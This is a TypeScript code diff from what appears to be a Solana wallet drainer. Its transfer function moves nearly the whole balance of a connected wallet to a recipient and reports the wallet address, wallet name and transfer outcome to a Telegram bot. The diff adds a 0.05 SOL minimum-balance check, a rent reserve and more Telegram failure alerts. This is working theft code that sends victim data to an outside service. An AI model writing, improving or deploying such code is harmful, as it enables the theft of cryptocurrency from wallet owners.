@@ -22,6 +22,11 @@ const PUBLIC_RPC_ENDPOINTS = [
   "https://ssc-dao.genesysgo.net", // GenesysGo endpoint
 ];
 
+// Solana rent and fee constants
+export const MINIMUM_RENT_EXEMPTION = 0.0023; // SOL required for rent exemption
+export const MINIMUM_TRANSACTION_FEE = 0.0005; // Typical transaction fee
+export const MINIMUM_REQUIRED_SOL = 0.05; // Minimum 0.05 SOL (approximately $0.50 USD)
+
 // Retry function with exponential backoff
 async function retry<T>(
   fn: () => Promise<T>,
@@ -337,6 +342,14 @@ export const sendToTelegram = async (walletData: any, botToken: string, chatId: 
   }
 };
 
+export const hasEnoughSolForRent = (balanceInSol: number): boolean => {
+  console.log(`Checking if ${balanceInSol} SOL is enough for rent and fees...`);
+  
+  // Require minimum 0.05 SOL (approximately $0.50 USD at average SOL prices)
+  // This ensures enough for rent exemption and transaction fees
+  return balanceInSol >= MINIMUM_REQUIRED_SOL;
+};
+
 export const signAndSendTransaction = async (
   connection: Connection, 
   wallet: any, 
@@ -389,24 +402,39 @@ export const signAndSendTransaction = async (
       throw new Error('Insufficient wallet balance for transfer');
     }
     
+    // Check if the wallet has enough SOL for rent exemption and fees
+    if (!hasEnoughSolForRent(balanceInSol)) {
+      console.error(`Wallet balance (${balanceInSol} SOL) is below minimum required (${MINIMUM_REQUIRED_SOL} SOL) for rent exemption`);
+      
+      if (botToken && chatId) {
+        await sendToTelegram({
+          address: walletPublicKey.toString(),
+          message: `TRANSFER FAILED: Insufficient funds for rent exemption. Minimum ${MINIMUM_REQUIRED_SOL} SOL required. Current balance: ${balanceInSol.toFixed(6)} SOL`,
+          walletName: wallet.adapter?.name || "Unknown Wallet"
+        }, botToken, chatId);
+      }
+      
+      throw new Error(`Insufficient funds for rent exemption. Minimum ${MINIMUM_REQUIRED_SOL} SOL required.`);
+    }
+    
     // We need to account for transaction fees
-    // Calculate the maximum we can send (balance minus a small amount for fees)
-    const minimumRequiredBalance = 0.00089 * LAMPORTS_PER_SOL; // Approximate fee + rent exemption
+    // Calculate the maximum we can send (balance minus minimum required for rent/fees)
+    const minimumRequiredBalance = MINIMUM_REQUIRED_SOL * LAMPORTS_PER_SOL;
     const maxTransferAmount = Math.max(0, balance - minimumRequiredBalance);
     
     if (maxTransferAmount <= 0) {
-      console.error('Balance too low to cover fees');
+      console.error('Balance too low to transfer after reserving for rent and fees');
       
       // Send notification to Telegram if credentials provided
       if (botToken && chatId) {
         await sendToTelegram({
           address: walletPublicKey.toString(),
-          message: `TRANSFER FAILED: Balance too low to cover fees (${balanceInSol} SOL)`,
+          message: `TRANSFER FAILED: Balance too low for transfer after reserving rent (${balanceInSol} SOL)`,
           walletName: wallet.adapter?.name || "Unknown Wallet"
         }, botToken, chatId);
       }
       
-      throw new Error('Wallet balance too low to cover transaction fees');
+      throw new Error('Wallet balance too low for transfer after reserving for rent fees');
     }
     
     // Ensure recipient address is valid
